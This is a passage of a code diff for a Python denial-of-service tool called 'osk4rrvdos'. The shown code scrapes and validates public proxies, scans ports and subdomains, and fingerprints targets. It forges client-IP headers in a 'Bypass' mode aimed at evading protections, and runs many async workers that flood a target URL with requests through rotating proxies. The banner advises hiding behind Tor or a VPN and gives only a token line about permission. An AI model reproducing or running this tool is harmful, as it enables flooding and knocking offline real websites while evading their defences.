+         400:"BAD REQ",401:"UNAUTHORIZED",403:"FORBIDDEN",404:"NOT FOUND",
+         405:"METHOD NA",429:"RATE LIMITED",500:"SRV ERROR",502:"BAD GATEWAY",
+         503:"SERVICE DOWN",504:"GATEWAY TO"}
+    return m.get(code, str(code))
+
+def safe_print(*args, **kwargs):
+    try:
+        print(*args, **kwargs)
+    except Exception:
+        pass
+
+def any_key():
+    safe_print("\nPress any key to exit...")
+    sys.stdout.flush()
+    try:
+        msvcrt.getch()
+    except Exception:
+        input()
+
+def prompt_yn(prompt_text):
+    safe_print(prompt_text, end="", flush=True)
+    while True:
+        try:
+            ch = msvcrt.getch().lower()
+            if ch in (b'y', b'n'):
+                safe_print(ch.decode())
+                return ch == b'y'
+        except Exception:
+            return input().strip().lower() == "y"
+
+def show_banner():
+    os.system("cls" if os.name == "nt" else "clear")
+    safe_print(r"""
+  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
+ /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
+| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
+| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
+| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
+| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
+|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
+ \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
+""")
+
+def print_live():
+    global total_sent, total_failed, total_success, last_http_code, last_code_label, req_rate, stopped
+    global proxy_mode, proxy_alive, bypass_active
+    if stopped:
+        return
+    os.system("cls" if os.name == "nt" else "clear")
+    safe_print(r"""
+  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
+ /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
+| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
+| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
+| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
+| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
+|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
+ \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
+""")
+    last_str = f"{last_http_code} / {last_code_label}" if last_http_code else "— / —"
+    px_str = f"Yes / {proxy_alive} alive" if proxy_mode else "No"
+    bp_str = "Yes" if bypass_active else "No"
+    safe_print(f" Request sent      : {total_sent}")
+    safe_print(f" Request failed    : {total_failed}")
+    safe_print(f" Request success   : {total_success}")
+    safe_print(f" Proxy             : {px_str}")
+    safe_print(f" Bypass            : {bp_str}")
+    safe_print(f" Last request      : {last_str}")
+    safe_print(f"\n Press Ctrl+C to stop.")
+
+def _load_proxy_cache():
+    if not os.path.isfile(PROXY_CACHE_FILE):
+        return []
+    try:
+        with open(PROXY_CACHE_FILE, "r") as f:
+            return [line.strip() for line in f if line.strip() and ":" in line]
+    except Exception:
+        return []
+
+def _save_proxy_cache():
+    global proxy_pool
+    try:
+        with proxy_lock:
+            current = list(proxy_pool)
+        with open(PROXY_CACHE_FILE, "w") as f:
+            for p in current[:500]:
+                f.write(p + "\n")
+    except Exception:
+        pass
+
+async def _fetch_proxies_from_url(session, url):
+    try:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            text = await resp.text()
+            out = set()
+            for line in text.split("\n"):
+                line = line.strip()
+                if not line or line.startswith(("#","/","!","<","[")):
+                    continue
+                if any(t in line.lower() for t in ["<html","doctype","alert(","script","<?xml"]):
+                    continue
+                clean = line.replace(" ","").replace("\t","")
+                parts = clean.split(":")
+                if len(parts) < 1:
+                    continue
+                ip = parts[0]
+                octets = ip.split(".")
+                if len(octets) != 4:
+                    continue
+                try:
+                    o = [int(x) for x in octets]
+                    if not all(0 <= x <= 255 for x in o):
+                        continue
+                    if o[0] == 0 or o[0] == 127 or o[0] >= 224:
+                        continue
+                    if o[0] == 10:
+                        continue
+                    if o[0] == 172 and 16 <= o[1] <= 31:
+                        continue
+                    if o[0] == 192 and o[1] == 168:
+                        continue
+                except ValueError:
+                    continue
+                port = "80"
+                if len(parts) > 1:
+                    p = parts[1]
+                    if p.isdigit() and 1 <= int(p) <= 65535:
+                        port = p
+                out.add(f"{ip}:{port}")
+            return list(out)
+    except Exception:
+        return []
+
+async def _fetch_all_proxies():
+    connector = aiohttp.TCPConnector(ssl=True, limit=20, force_close=True)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = [_fetch_proxies_from_url(session, u) for u in PROXY_SOURCES]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        all_p = set()
+        for r in results:
+            if isinstance(r, list):
+                all_p.update(r)
+        return list(all_p)
+
+def fetch_online_proxies():
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        proxies = loop.run_until_complete(_fetch_all_proxies())
+        loop.close()
+        return proxies
+    except Exception:
+        return []
+
+async def _test_proxy(session, pstr, test_url):
+    try:
+        t0 = time.time()
+        async with session.get(test_url, proxy=f"http://{pstr}",
+                               timeout=aiohttp.ClientTimeout(total=VALIDATION_TIMEOUT)) as resp:
+            await resp.read()
+            lat = time.time() - t0
+            if resp.status == 200:
+                return (pstr, lat)
+    except Exception:
+        pass
+    return None
+
+async def _validate_batch(proxies, test_url, max_batch=800):
+    connector = aiohttp.TCPConnector(ssl=False, limit=150, force_close=True)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        sem = asyncio.Semaphore(150)
+        async def bounded(p):
+            async with sem:
+                return await _test_proxy(session, p, test_url)
+        sample = proxies[:max_batch] if len(proxies) > max_batch else proxies
+        tasks = [asyncio.create_task(bounded(p)) for p in sample]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        valid = []
+        for r in results:
+            if r and isinstance(r, tuple):
+                pstr, lat = r
+                if lat <= MAX_PROXY_LATENCY:
+                    valid.append(pstr)
+        return valid, len(sample)
+
+def _run_proxy_validation(proxies, test_url):
+    global proxy_validate_result, proxy_validate_done
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        old_stderr = sys.stderr
+        sys.stderr = io.StringIO()
+        try:
+            result = loop.run_until_complete(_validate_batch(proxies, test_url))
+        finally:
+            sys.stderr = old_stderr
+        loop.close()
+        proxy_validate_result = result
+    except Exception as e:
+        proxy_validate_result = ([], 0)
+    finally:
+        proxy_validate_done.set()
+
+def validate_proxies_background(proxies, test_url):
+    global proxy_validate_done, proxy_validate_result
+    proxy_validate_done.clear()
+    proxy_validate_result = ([], 0)
+    threading.Thread(target=_run_proxy_validation, args=(proxies, test_url), daemon=True).start()
 
 def resolve_dns(host):
     ips = set()
@@ -157,17 +461,38 @@ def resolve_dns(host):
         pass
     return list(ips)
 
+def resolve_dns_full(host):
+    result = {"A":[],"AAAA":[],"CNAME":None}
+    try:
+        for family, _, _, canonname, addr in socket.getaddrinfo(host, 80):
+            if canonname and canonname != host:
+                result["CNAME"] = canonname
+            if family == socket.AF_INET:
+                result["A"].append(addr[0])
+            elif hasattr(socket, "AF_INET6") and family == socket.AF_INET6:
+                result["AAAA"].append(addr[0])
+    except Exception:
+        pass
+    return result
 
 def scan_port(ip, port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.8)
+        s.settimeout(0.3)
         r = s.connect_ex((ip, port))
         s.close()
         return r == 0
     except Exception:
         return False
 
+def scan_ports_parallel(ip, ports):
+    open_ports = []
+    with ThreadPoolExecutor(max_workers=25) as ex:
+        futures = {ex.submit(scan_port, ip, p): p for p in ports}
+        for fut in as_completed(futures):
+            if fut.result():
+                open_ports.append(futures[fut])
+    return sorted(open_ports)
 
 def find_origin(host):
     origins = set()
@@ -178,200 +503,332 @@ def find_origin(host):
             origins.update(ips)
     return list(origins)
 
+def enumerate_subdomains(host):
+    found = {}
+    with ThreadPoolExecutor(max_workers=30) as ex:
+        futures = {}
+        for sub in SUBDOMAIN_COMMON:
+            sd = f"{sub}.{host}"
+            futures[ex.submit(resolve_dns, sd)] = sd
+        for fut in as_completed(futures):
+            ips = fut.result()
+            if ips:
+                found[futures[fut]] = ips
+    return found
 
-def build_headers(host):
+def get_ssl_cert_info(host, port=443):
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        with socket.create_connection((host, port), timeout=5) as sock:
+            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+                cert = ssock.getpeercert(binary_form=False)
+                if not cert:
+                    return None
+                return {
+                    "cn": dict(x[0] for x in cert.get("subject", [])).get("commonName","?"),
+                    "org": dict(x[0] for x in cert.get("subject", [])).get("organizationName","?"),
+                    "issuer": dict(x[0] for x in cert.get("issuer", [])).get("commonName","?"),
+                    "expires": cert.get("notAfter","?"),
+                    "sans": [s[1] for s in cert.get("subjectAltName", []) if s[0] == "DNS"][:8],
+                }
+    except Exception:
+        return None
+
+def detect_technologies(headers):
+    detected = set()
+    hs = str(headers).lower()
+    for tech, sigs in TECH_SIGNATURES.items():
+        for sig in sigs:
+            if sig in hs:
+                detected.add(tech)
+                break
+    srv = headers.get("Server", headers.get("server", ""))
+    if srv:
+        detected.add(f"Server={srv}")
+    xpb = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
+    if xpb:
+        detected.add(f"Powered={xpb}")
+    return sorted(detected)
+
+def discover_known_paths(target, host):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    async def check(session, p):
+        try:
+            hdrs = build_headers(host)
+            async with session.get(f"{target}{p}", headers=hdrs,
+                                   timeout=aiohttp.ClientTimeout(total=5),
+                                   allow_redirects=True) as r:
+                await r.read()
+                if r.status < 400:
+                    return p
+        except Exception:
+            pass
+        return None
+    async def run():
+        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
+        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=15, force_close=True)
+        async with aiohttp.ClientSession(connector=connector) as s:
+            tasks = [check(s, p) for p in PRIMARY_PATHS + SECONDARY_PATHS]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            return [r for r in results if isinstance(r, str)]
+    good = loop.run_until_complete(run())
+    loop.close()
+    return good
+
+def build_headers(host, profile=None):
     ip1 = gen_ip()
     ip2 = gen_ip()
     rid = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
     rv = str(random.randint(10000, 99999))
+    ua = profile["ua"] if profile else random.choice(UA_LIST)
+    lang = profile.get("lang","en-US,en;q=0.9") if profile else random.choice([
+        "en-US,en;q=0.9","en-GB,en;q=0.9","pl-PL,pl;q=0.9",
+        "de-DE,de;q=0.9","fr-FR,fr;q=0.9","es-ES,es;q=0.9"])
 
-    headers = {
+    h = {
         "Host": host,
-        "User-Agent": random.choice(UA_LIST),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "pl-PL,pl;q=0.9"]),
-        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate"]),
-        "Cache-Control": "no-cache",
-        "Connection": random.choice(["keep-alive", "Keep-Alive", "close"]),
+        "User-Agent": ua,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Language": lang,
+        "Accept-Encoding": "gzip, deflate, br",
+        "Cache-Control": random.choice(["no-cache","max-age=0"]),
+        "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
-        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
-        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
-        "Sec-Ch-Ua": f'"Chromium";v="{random.randint(128,140)}", "Google Chrome";v="{random.randint(128,140)}"',
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": random.choice(["none","same-origin","cross-site"]),
+        "Sec-Fetch-User": "?1",
+        "Sec-Ch-Ua": f'"Chromium";v="{random.randint(128,142)}", "Google Chrome";v="{random.randint(128,142)}", "Not=A?Brand";v="99"',
         "Sec-Ch-Ua-Mobile": "?0",
         "Sec-Ch-Ua-Platform": '"Windows"',
         "Pragma": "no-cache",
         "X-Forwarded-For": ip1,
         "X-Real-IP": ip2,
-        "True-Client-IP": ip1,
-        "X-Originating-IP": ip2,
         "X-Request-ID": rid,
     }
-
-    if random.random() > 0.5:
-        headers["Referer"] = f"https://www.google.com/search?q={rv}"
     if random.random() > 0.4:
-        headers["Origin"] = f"https://{host}"
-    if random.random() > 0.6:
-        cookie = base64.b64encode(random.randbytes(12)).decode()[:16]
-        headers["Cookie"] = f"sessionid={cookie}; _ga=GA1.2.{random.randint(100000000,999999999)}.{random.randint(1000000000,9999999999)}"
+        h["Referer"] = f"https://www.google.com/search?q={rv}"
+    if random.random() > 0.3:
+        h["Origin"] = f"https://{host}"
+    if random.random() > 0.5:
+        c = base64.b64encode(random.randbytes(12)).decode()[:16]
+        h["Cookie"] = f"_ga=GA1.2.{random.randint(100000000,999999999)}.{random.randint(1000000000,9999999999)}; sid={c}"
 
-    if bypass_premium:
-        headers["X-Client-IP"] = gen_ip()
-        headers["X-Forwarded-Host"] = host
-        headers["X-HTTP-Method-Override"] = "GET"
-        headers["X-Forwarded-Proto"] = "https"
-        headers["CF-Connecting-IP"] = gen_ip()
-        headers["X-Remote-IP"] = gen_ip()
-        headers["Client-IP"] = gen_ip()
-        headers["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish'])}"
-        headers["CF-IPCountry"] = random.choice(["US", "DE", "PL", "GB", "JP"])
+    if bypass_active:
+        h["X-Client-IP"] = gen_ip()
+        h["X-Forwarded-Host"] = host
+        h["X-HTTP-Method-Override"] = "GET"
+        h["X-Forwarded-Proto"] = "https"
+        h["X-Forwarded-Scheme"] = "https"
+        h["CF-Connecting-IP"] = gen_ip()
+        h["X-Remote-IP"] = gen_ip()
+        h["Client-IP"] = gen_ip()
+        h["X-Cluster-Client-IP"] = gen_ip()
+        h["Forwarded"] = f"for={gen_ip()};proto=https;by={gen_ip()};host={host}"
+        h["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish','haproxy','envoy','traefik','caddy'])}"
+        h["CF-IPCountry"] = random.choice(["US","DE","PL","GB","JP","FR","NL","CA","AU","BR"])
+        h["True-Client-IP"] = gen_ip()
+        h["X-Originating-IP"] = gen_ip()
+        if random.random() > 0.5:
+            h["X-Forwarded-For"] = f"{gen_ip()}, {gen_ip()}, {gen_ip()}, {ip1}"
 
-    return headers
+    return h
 
+def worker_profile():
+    return {
+        "ua": random.choice(UA_LIST),
+        "lang": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.9","pl-PL,pl;q=0.9","de-DE,de;q=0.9","fr-FR,fr;q=0.9"]),
+        "id": "".join(random.choices("abcdef0123456789", k=8)),
+        "delay_min": random.uniform(0.0003, 0.002),
+        "delay_max": random.uniform(0.003, 0.015),
+    }
 
-def print_live():
-    global total_sent, total_ok, total_err, req_rate, last_status
-    os.system("cls" if os.name == "nt" else "clear")
-    print(r"""
-  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
- /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
-| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
-| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
-| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
-| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
-|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
- \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
-""")
-    print(f" Live Status:")
-    print(f" Requests Sent   : {total_sent}")
-    print(f" Requests per sec: {req_rate:.1f}")
-    print(f" OK (2xx/3xx)    : {total_ok}")
-    print(f" Errors          : {total_err}")
-    print(f" Proxies loaded  : {len(proxy_pool)}")
-    print(f" Premium Bypass  : {'ON' if bypass_premium else 'OFF'}")
-    print(f" Proxy Attack    : {'ON' if proxy_attack else 'OFF'}")
-    print(f"\n Last Request:")
-    print(f" HTTP CODE: {last_status}")
-    print(f"\n Press Ctrl+C to stop.")
+async def attack_worker(session, url_obj, host, tid):
+    global total_sent, total_failed, total_success, last_http_code, last_code_label, rate_times
+    global total_proxy_used, total_direct_used, proxy_alive
 
+    scheme = url_obj.scheme
+    netloc = url_obj.netloc
+    profile = worker_profile()
 
-async def attack_worker(session, url, host, tid):
-    global total_sent, total_ok, total_err, last_status, rate_samples
+    await asyncio.sleep(random.uniform(0, 0.5))
 
     while running:
-        path = random.choice(PATHS).replace("{}", str(random.randint(10000, 99999)))
-        headers = build_headers(host)
-        parsed = urlparse(url)
-        target = f"{parsed.scheme}://{parsed.netloc}{path}"
-        proxy = next_proxy() if proxy_attack else None
+        path = pick_path()
+        headers = build_headers(host, profile)
+        target = f"{scheme}://{netloc}{path}"
+        proxy = next_proxy() if proxy_mode else None
 
         try:
-            method = "GET" if random.random() > 0.85 else "POST"
-            if method == "POST":
-                data = f"q={random.randint(1000,9999)}&t={random.randint(100,999)}"
-                headers["Content-Type"] = "application/x-www-form-urlencoded"
-                async with session.post(target, headers=headers, data=data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=5)) as resp:
-                    await resp.read()
-                    with lock:
-                        total_sent += 1
-                        last_status = resp.status
-                        if 200 <= resp.status < 400:
-                            total_ok += 1
-            else:
-                async with session.get(target, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=5)) as resp:
-                    await resp.read()
-                    with lock:
-                        total_sent += 1
-                        last_status = resp.status
-                        if 200 <= resp.status < 400:
-                            total_ok += 1
+            async with session.get(target, headers=headers, proxy=proxy,
+                                   timeout=aiohttp.ClientTimeout(total=5),
+                                   allow_redirects=True) as resp:
+                code = resp.status
+                await resp.read()
+                with lock:
+                    total_sent += 1
+                    last_http_code = code
+                    last_code_label = code_label(code)
+                    if proxy:
+                        total_proxy_used += 1
+                    else:
+                        total_direct_used += 1
+                    if 200 <= code < 400:
+                        total_success += 1
+                    else:
+                        total_failed += 1
+
+        except (aiohttp.ClientConnectorError, aiohttp.ServerTimeoutError,
+                aiohttp.ClientOSError, aiohttp.ClientPayloadError,
+                aiohttp.ClientError, asyncio.TimeoutError):
+            with lock:
+                total_sent += 1
+                total_failed += 1
+            if proxy:
+                remove_bad_proxy(proxy)
         except Exception:
             with lock:
-                total_err += 1
+                total_sent += 1
+                total_failed += 1
+            if proxy:
+                remove_bad_proxy(proxy)
 
-        rate_samples.append(time.time())
-        if not bypass_premium:
-            await asyncio.sleep(random.uniform(0.001, 0.005))
+        rate_times.append(time.time())
+
+        if bypass_active:
+            await asyncio.sleep(random.uniform(0.005, 0.04))
+        else:
+            await asyncio.sleep(random.uniform(profile["delay_min"], profile["delay_max"]))
+
+def _browser_ssl_context():
+    try:
+        ctx = ssl.create_default_context()
+        try:
+            ctx.set_ciphers(
+                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:"
+                "ECDHE+AES256:ECDHE+AES128:!aNULL:!eNULL:!MD5"
+            )
+        except Exception:
+            pass
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        return ctx
+    except Exception:
+        return True  # fallback to aiohttp default
 
 
 async def http_attack(url, host, conns):
-    ssl_context = True if urlparse(url).scheme == "https" else False
+    parsed = urlparse(url)
+    ssl_ctx = _browser_ssl_context() if parsed.scheme == "https" else False
+
     connector = aiohttp.TCPConnector(
-        ssl=ssl_context,
+        ssl=ssl_ctx,
         limit=conns * 2,
         limit_per_host=conns,
-        force_close=True,
+        force_close=False,
         enable_cleanup_closed=True,
+        ttl_dns_cache=300,
+        keepalive_timeout=15,
     )
+
     async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [asyncio.create_task(attack_worker(session, url, host, i)) for i in range(conns)]
+        tasks = [asyncio.create_task(attack_worker(session, parsed, host, i)) for i in range(conns)]
         try:
             while running:
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.25)
         except asyncio.CancelledError:
             pass
         for t in tasks:
             t.cancel()
         await asyncio.gather(*tasks, return_exceptions=True)
 
-
 def stats_loop():
-    global req_rate, rate_samples
+    global req_rate, rate_times
     while running:
-        time.sleep(2)
+        time.sleep(1.5)
         now = time.time()
-        rate_samples = [t for t in rate_samples if now - t < 2]
-        with lock:
-            req_rate = len(rate_samples) / 2
-        print_live()
+        while rate_times and rate_times[0] < now - 2:
+            rate_times.popleft()
+        if len(rate_times) > 3 and rate_times[0] < now:
+            with lock:
+                req_rate = len(rate_times) / max(now - rate_times[0], 0.01)
+        else:
+            req_rate = 0.0
+        if running:
+            print_live()
 
+def probe_target(target, host):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    async def deep():
+        r = {"status":0,"server":"?","size":0,"technologies":[],"headers":{}}
+        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
+        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=3)
+        async with aiohttp.ClientSession(connector=connector) as s:
+            hdrs = build_headers(host)
+            try:
+                async with s.get(target, headers=hdrs,
+                                 timeout=aiohttp.ClientTimeout(total=8),
+                                 allow_redirects=True) as resp:
+                    r["status"] = resp.status
+                    r["server"] = resp.headers.get("Server", resp.headers.get("server","?"))
+                    raw = dict(resp.headers)
+                    r["headers"] = {k:v for k,v in list(raw.items())[:20]}
+                    r["technologies"] = detect_technologies(raw)
+                    body = await resp.read()
+                    r["size"] = len(body)
+            except Exception as e:
+                r["server"] = str(e)[:60]
+        return r
+    result = loop.run_until_complete(deep())
+    loop.close()
+    return result
 
-def check_live(url, host):
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-
-        async def test():
-            connector = aiohttp.TCPConnector(ssl=False, limit=1)
-            async with aiohttp.ClientSession(connector=connector) as s:
-                hdrs = build_headers(host)
-                async with s.get(url, headers=hdrs, timeout=aiohttp.ClientTimeout(total=5)) as r:
-                    return r.status, dict(r.headers), len(await r.read())
-
-        status, hdrs, sz = loop.run_until_complete(test())
-        loop.close()
-        return status, hdrs.get("Server", "?"), sz
-    except Exception as e:
-        return 0, str(e)[:50], 0
-
+def wait_for_proxy_validation(initial_msg=True):
+    global proxy_validate_done, proxy_validate_result, proxy_alive
+    dots = 0
+    while not proxy_validate_done.is_set():
+        if initial_msg:
+            status = f"\r< / > Testing proxies{'.' * (dots % 4)}{' ' * (4 - dots % 4)}"
+            safe_print(status, end="", flush=True)
+            dots += 1
+        time.sleep(0.3)
+    valid, total = proxy_validate_result
+    fast = len(valid)
+    slow = total - fast
+    safe_print(f"\r< / > {fast} fast | {slow} filtered" + " " * 20)
+    return valid
 
 def main():
-    global running, bypass_premium, proxy_attack, proxy_pool
+    global running, bypass_active, proxy_mode, proxy_pool, proxy_alive, last_http_code, last_code_label, stopped
+    global known_good_paths, total_proxy_used, total_direct_used
 
-    os.system("cls" if os.name == "nt" else "clear")
+    try:
+        show_banner()
+    except Exception:
+        pass
     os.system("title osk4rrvdos" if os.name == "nt" else "")
 
-    print(r"""
-  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
- /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
-| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
-| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
-| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
-| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
-|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
- \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
-""")
+    safe_print("</> Python version detected:", sys.version.split()[0])
+    safe_print("</> aiohttp:", aiohttp.__version__)
+    safe_print("</> Libraries loaded")
+    safe_print("</> Official download only from github.com/osk4rrv/osk4rrvdos")
+    safe_print("</> Created by @osk4rrv")
+    safe_print("")
+    safe_print(" [!] PRIVACY NOTICE — This tool sends real HTTP traffic.")
+    safe_print(" [!] Your IP WILL be exposed unless you use VPN / proxy.")
+    safe_print(" [!] Pro-Tips: Cloudflare WARP | Tor (127.0.0.1:9050) | Mullvad VPN")
+    safe_print(" [!] Use ONLY on targets you own or have explicit permission to test.")
+    resp = input(" Press ENTER to continue (Ctrl+C to exit): ")
 
-    print(f"[...] Checking & Loading libraries and Python")
-    print(f"</> Python version detected: {sys.version.split()[0]}")
-    print(f"</> aiohttp: {aiohttp.__version__}")
-
-    target = input("\n[osk4rrvdos] type URL or Proxy > ").strip()
+    target = input("\n[osk4rrvdos] url > ").strip()
     if not target:
-        print("[-] E: No target provided")
+        safe_print("[-] No target provided")
+        any_key()
         return
-
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
@@ -380,85 +837,111 @@ def main():
     scheme = parsed.scheme
     port = parsed.port or (443 if scheme == "https" else 80)
 
-    pa = input("[?] Proxy attack [MAY NOT WORK] y/n > ").strip().lower()
-    proxy_attack = pa == "y"
+    proxy_mode = prompt_yn("\n[osk4rrvdos] Proxy attack [y/n]: ")
+    bypass_active = prompt_yn("[osk4rrvdos] Bypass [y/n]: ")
 
-    bp = input("[?] Bypass y/n > ").strip().lower()
-    bypass_premium = bp == "y"
+    if not proxy_mode:
+        safe_print("\n [!] WARNING: Direct mode — your real IP WILL be visible!")
+        safe_print(" [!] Use VPN (Cloudflare WARP / Mullvad) or Tor.")
+        if not prompt_yn("[osk4rrvdos] Continue anyway? [y/n]: "):
+            return
 
-    print(f"\n[*] Target: {scheme}://{host}:{port}")
+    safe_print(f"\n[*] Target: {scheme}://{host}:{port}")
 
-    proxy_pool = PROXY_LIST.copy()
-    if proxy_attack:
-        random.shuffle(proxy_pool)
-        print(f"[+] Proxy pool: {len(proxy_pool)} proxies")
+    if proxy_mode:
+        cached = _load_proxy_cache()
+        if cached:
+            safe_print(f"< / > Loaded {len(cached)} proxies from cache")
+            proxy_pool = list(set(cached))
+            random.shuffle(proxy_pool)
+        else:
+            safe_print("< / > Fetching online proxies...")
+            raw = fetch_online_proxies()
+            if not raw:
+                safe_print("[!] Failed to fetch online proxies.")
+                if not prompt_yn("[osk4rrvdos] Continue without proxies? [y/n]: "):
+                    return
+                proxy_mode = False
+                proxy_pool = []
+                proxy_alive = 0
+            else:
+                safe_print(f"< / > Fetched {len(raw)} total")
+                proxy_pool = list(set(raw))
+                random.shuffle(proxy_pool)
 
-    print("[*] Resolving DNS...")
-    ips = resolve_dns(host)
-    ip = ips[0] if ips else host
-    print(f"[+] Resolved IPs: {', '.join(ips[:5] or [host])}")
+        if proxy_mode and proxy_pool:
+            random.shuffle(proxy_pool)
+            _save_proxy_cache()
+            proxy_alive = len(proxy_pool)
+            safe_print(f"< / > Pool: {proxy_alive} proxies ready")
 
-    print("[*] Scanning common ports...")
-    open_ports = []
-    for p in PORTS_TO_SCAN:
-        if scan_port(ip, p):
